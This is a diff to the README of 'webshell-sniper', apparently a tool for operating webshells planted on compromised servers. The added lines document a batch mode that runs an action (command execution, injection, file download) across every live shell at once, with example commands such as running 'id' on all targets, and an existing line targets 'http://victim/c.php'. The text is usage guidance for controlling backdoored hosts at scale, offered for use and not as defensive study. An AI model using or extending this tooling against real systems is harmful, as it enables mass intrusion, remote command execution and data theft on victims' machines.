@@ -55,7 +55,18 @@ webshell-sniper --proxy http://127.0.0.1:8080 --insecure http://victim/c.php POS
 
 # manage several shells at once
 webshell-sniper -f webshells.json
+
+# non-interactive batch: run one action across all shells and write a JSON report
+webshell-sniper -f webshells.json --batch exec --arg "id"
+webshell-sniper -f webshells.json --batch inject
 ```
+
+### Batch mode
+
+`--batch {info,exec,inject,download}` loops a single action over every live
+shell, writes a `batch_<action>_<ts>.json` report to the output dir, and exits
+without entering the REPL — handy for scripting against many targets. `--arg`
+supplies the command (for `exec`) or remote path (for `download`).
 
 `webshells.json` is a list of endpoints:
 
